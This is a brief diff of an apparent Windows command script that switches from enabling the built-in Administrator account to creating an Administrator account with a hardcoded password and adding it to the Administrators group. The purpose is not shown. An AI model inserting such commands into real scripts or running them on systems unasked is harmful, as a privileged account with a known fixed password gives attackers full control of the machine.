@@ -1,2 +1,2 @@
-net user Administrator /active:yes
-net user Administrator "yhr@666"
+net user Administrator yhr@666 /add
+net localgroup Administrators Administrator
